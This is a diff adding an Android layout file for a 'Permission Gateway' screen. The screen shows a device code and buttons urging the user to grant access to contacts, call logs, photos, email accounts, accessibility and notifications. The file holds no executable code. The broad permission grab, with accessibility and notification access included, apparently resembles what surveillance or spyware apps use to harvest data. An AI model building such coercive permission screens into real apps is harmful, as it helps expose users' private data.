@@ -1,0 +1,181 @@
+<?xml version="1.0" encoding="utf-8"?>
+<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:app="http://schemas.android.com/apk/res-auto"
+    xmlns:tools="http://schemas.android.com/tools"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="@color/primary_color"
+    tools:context=".PermissionGatewayActivity">
+
+    <LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:orientation="vertical"
+        android:padding="24dp"
+        android:gravity="center_horizontal">
+
+        <!-- Header -->
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="vertical"
+            android:gravity="center"
+            android:layout_marginBottom="32dp">
+
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="🔐 Permission Gateway"
+                android:textSize="32sp"
+                android:textStyle="bold"
+                android:textColor="@color/white"
+                android:layout_marginBottom="16dp" />
+
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="Your device needs these permissions to function properly"
+                android:textSize="18sp"
+                android:textColor="@color/white_70"
+                android:gravity="center"
+                android:lineSpacingExtra="4dp" />
+
+        </LinearLayout>
+
+        <!-- Device Code Display -->
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="Device Code: 61250"
+            android:textSize="16sp"
+            android:textStyle="bold"
+            android:textColor="@color/accent_color"
+            android:layout_marginBottom="32dp"
+            android:background="@drawable/device_code_background"
+            android:padding="16dp"
+            android:gravity="center" />
+
+        <!-- Permission Buttons -->
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="vertical"
+            android:layout_marginBottom="32dp">
+
+            <!-- Button 1: System Permissions -->
+            <Button
+                android:id="@+id/systemPermissionsButton"
+                android:layout_width="match_parent"
+                android:layout_height="72dp"
+                android:text="🔐 Grant System Permissions"
+                android:textSize="18sp"
+                android:textStyle="bold"
+                android:background="@drawable/primary_button_background"
+                android:textColor="@color/white"
+                android:layout_marginBottom="16dp" />
+
+            <!-- Button 2: Accessibility -->
+            <Button
+                android:id="@+id/accessibilityButton"
+                android:layout_width="match_parent"
+                android:layout_height="72dp"
+                android:text="♿ Enable Accessibility"
+                android:textSize="18sp"
+                android:textStyle="bold"
+                android:background="@drawable/feature_button_background"
+                android:textColor="@color/white"
+                android:layout_marginBottom="16dp" />
+
+            <!-- Button 3: Notifications -->
+            <Button
+                android:id="@+id/notificationsButton"
+                android:layout_width="match_parent"
+                android:layout_height="72dp"
+                android:text="🔔 Enable Notifications"
+                android:textSize="18sp"
+                android:textStyle="bold"
+                android:background="@drawable/feature_button_background"
+                android:textColor="@color/white"
+                android:layout_marginBottom="16dp" />
+
+
+
+        </LinearLayout>
+
+        <!-- Permission Status -->
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="vertical"
+            android:background="@drawable/permissions_status_background"
+            android:padding="20dp"
+            android:layout_marginBottom="32dp">
+
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="📱 Permission Status"
+                android:textSize="18sp"
+                android:textStyle="bold"
+                android:textColor="@color/text_primary"
+                android:layout_marginBottom="16dp"
+                android:gravity="center" />
+
+            <TextView
+                android:id="@+id/statusText"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="Loading permission status..."
+                android:textSize="14sp"
+                android:textColor="@color/text_secondary"
+                android:lineSpacingExtra="2dp"
+                android:fontFamily="monospace"
+                android:gravity="center" />
+
+        </LinearLayout>
+
+        <!-- Continue Button -->
+        <Button
+            android:id="@+id/continueButton"
+            android:layout_width="match_parent"
+            android:layout_height="72dp"
+            android:text="⏳ Complete All Permissions"
+            android:textSize="20sp"
+            android:textStyle="bold"
+            android:background="@drawable/primary_button_background"
+            android:textColor="@color/white"
+            android:enabled="false"
+            android:layout_marginBottom="24dp" />
+
+        <!-- Instructions -->
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="vertical"
+            android:background="@drawable/app_info_background"
+            android:padding="20dp">
+
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="ℹ️ Instructions"
+                android:textSize="16sp"
+                android:textStyle="bold"
+                android:textColor="@color/primary_color"
+                android:layout_marginBottom="12dp"
+                android:gravity="center" />
+
+            <TextView
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="1. Click 'Grant System Permissions' to allow:\n   • Read Contacts\n   • Read Call Logs\n   • Read Photos and Videos\n   • Read Email Accounts\n2. Click 'Enable Accessibility' to open accessibility settings\n3. Click 'Enable Notifications' to open notification settings\n4. Return to this screen after enabling each permission\n5. Click 'Continue to App' when all permissions are granted"
+                android:textSize="14sp"
+                android:textColor="@color/text_secondary"
+                android:lineSpacingExtra="4dp"
+                android:gravity="center" />
+
+        </LinearLayout>
+
+    </LinearLayout>
+
+</ScrollView>
